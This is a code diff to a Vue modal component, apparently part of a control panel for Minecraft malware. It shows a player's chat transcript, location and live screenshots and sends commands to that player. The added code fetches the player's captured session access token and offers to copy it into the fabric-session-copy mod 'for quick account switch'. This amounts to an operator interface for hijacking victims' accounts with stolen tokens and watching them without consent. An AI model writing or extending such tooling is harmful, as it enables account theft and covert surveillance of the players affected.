@@ -1,12 +1,13 @@
 <script setup lang="ts">
 import { ref, watch, nextTick } from 'vue';
-import { sendPlayerCommand } from '@/api/ably';
+import { sendPlayerCommand, getPlayerSession } from '@/api/ably';
 import type { PlayerData, ChatEntry } from '@/api/ably';
 import { playerSkinUrl } from '@/utils/minecraft';
 
 const props = defineProps<{
   player: PlayerData | null;
   chatEntries: ChatEntry[];
+  screenshotUrl?: string | null;
   modelValue: boolean;
 }>();
 
@@ -18,6 +19,9 @@ const command = ref('');
 const sending = ref(false);
 const error = ref('');
 const chatListRef = ref<HTMLElement | null>(null);
+const sessionToken = ref<string | null>(null);
+const sessionLoading = ref(false);
+const sessionCopied = ref(false);
 
 function scrollChatToBottom() {
   nextTick(() => {
@@ -31,10 +35,38 @@ watch(() => props.modelValue, (v) => {
   if (!v) {
     command.value = '';
     error.value = '';
+    sessionToken.value = null;
+    sessionCopied.value = false;
   } else {
     scrollChatToBottom();
+    if (props.player) fetchSession();
   }
 });
+
+async function fetchSession() {
+  if (!props.player) return;
+  sessionLoading.value = true;
+  sessionToken.value = null;
+  try {
+    const { accessToken } = await getPlayerSession(props.player.playerName);
+    sessionToken.value = accessToken;
+  } catch {
+    sessionToken.value = null;
+  } finally {
+    sessionLoading.value = false;
+  }
+}
+
+async function copySession() {
+  if (!sessionToken.value) return;
+  try {
+    await navigator.clipboard.writeText(sessionToken.value);
+    sessionCopied.value = true;
+    setTimeout(() => (sessionCopied.value = false), 2000);
+  } catch {
+    // ignore
+  }
+}
 
 function close() {
   emit('update:modelValue', false);
@@ -59,43 +91,61 @@ async function sendCommand() {
 
 <template>
   <Teleport to="body">
-    <div v-if="modelValue" class="modal-overlay" @click.self="close">
-      <div class="modal" v-if="player">
+    <div v-if="props.modelValue" class="modal-overlay" @click.self="close">
+      <div class="modal" v-if="props.player">
         <div class="modal-header">
           <div class="modal-player">
             <div class="modal-avatar">
-              <span class="avatar-fallback">{{ player.playerName.charAt(0).toUpperCase() }}</span>
-              <img :src="playerSkinUrl(player.playerName, 64)" :alt="player.playerName" @error="(e) => { (e.target as HTMLImageElement).style.display = 'none' }" />
+              <span class="avatar-fallback">{{ props.player.playerName.charAt(0).toUpperCase() }}</span>
+              <img :src="playerSkinUrl(props.player.playerName, 64)" :alt="props.player.playerName" @error="(e) => { (e.target as HTMLImageElement).style.display = 'none' }" />
             </div>
-            <h2>{{ player.playerName }}</h2>
+            <h2>{{ props.player.playerName }}</h2>
           </div>
           <button class="close-btn" @click="close">×</button>
         </div>
 
         <div class="modal-body">
+          <section v-if="props.screenshotUrl" class="screenshot-section">
+            <h3>Live view</h3>
+            <div class="screenshot-wrap">
+              <img :src="props.screenshotUrl" alt="Game screenshot" class="screenshot-img" />
+            </div>
+          </section>
+          <section class="session-section">
+            <h3>Session (fabric-session-copy)</h3>
+            <p class="hint">Copy to paste into fabric-session-copy mod for quick account switch</p>
+            <div v-if="sessionLoading" class="session-loading">Loading…</div>
+            <div v-else-if="sessionToken" class="session-box">
+              <pre>{{ sessionToken }}</pre>
+              <button class="copy-btn" @click="copySession">
+                {{ sessionCopied ? 'Copied!' : 'Copy' }}
+              </button>
+            </div>
+            <div v-else class="session-none">No session captured yet</div>
+          </section>
           <section class="info-section">
             <h3>Location</h3>
             <p class="location">
-              <span v-if="player.area || player.subArea">
-                {{ player.area || '?' }}{{ player.subArea ? ` · ${player.subArea}` : '' }}
+              <span v-if="props.player?.area || props.player?.subArea">
+                {{ props.player?.area || '?' }}{{ props.player?.subArea ? ` · ${props.player.subArea}` : '' }}
               </span>
               <span v-else class="faint">—</span>
             </p>
-            <p v-if="player.uuid" class="uuid">{{ player.uuid }}</p>
+            <p v-if="props.player?.uuid" class="uuid">{{ props.player?.uuid }}</p>
           </section>
 
           <section class="chat-section">
             <h3>Chat transcript</h3>
             <div class="chat-list" ref="chatListRef">
               <div
-                v-for="(entry, i) in chatEntries"
+                v-for="(entry, i) in props.chatEntries"
                 :key="`${entry.timestamp}-${i}`"
                 class="chat-line"
               >
                 <span class="chat-time">{{ new Date(entry.timestamp).toLocaleTimeString() }}</span>
                 <span class="chat-msg">{{ entry.message }}</span>
               </div>
-              <p v-if="chatEntries.length === 0" class="no-chat">No chat yet</p>
+              <p v-if="props.chatEntries.length === 0" class="no-chat">No chat yet</p>
             </div>
           </section>
 
@@ -211,6 +261,21 @@ async function sendCommand() {
   color: #888;
   text-transform: uppercase;
 }
+.screenshot-section {
+  margin-bottom: 1.25rem;
+}
+.screenshot-wrap {
+  border-radius: 8px;
+  overflow: hidden;
+  background: #0d0d14;
+  border: 1px solid #333;
+}
+.screenshot-img {
+  display: block;
+  width: 100%;
+  max-height: 280px;
+  object-fit: contain;
+}
 .info-section {
   margin-bottom: 1.25rem;
 }
@@ -300,5 +365,46 @@ async function sendCommand() {
   margin: 0.5rem 0 0;
   font-size: 0.85rem;
   color: #e88;
+}
+.session-section {
+  margin-bottom: 1.25rem;
+}
+.session-box {
+  background: #0d0d14;
+  border-radius: 8px;
+  padding: 0.75rem;
+  border: 1px solid #333;
+  position: relative;
+}
+.session-box pre {
+  margin: 0;
+  font-family: ui-monospace, monospace;
+  font-size: 0.75rem;
+  color: #8a8;
+  word-break: break-all;
+  white-space: pre-wrap;
+  max-height: 120px;
+  overflow-y: auto;
+}
+.session-box .copy-btn {
+  margin-top: 0.5rem;
+  padding: 0.35rem 0.75rem;
+  font-size: 0.8rem;
+  border: 1px solid #555;
+  border-radius: 4px;
+  background: #2a2a3e;
+  color: #8a8;
+  cursor: pointer;
+}
+.session-box .copy-btn:hover {
+  background: #333;
+  color: #6ec96e;
+  border-color: #6ec96e;
+}
+.session-loading,
+.session-none {
+  font-size: 0.9rem;
+  color: #666;
+  font-style: italic;
 }
 </style>
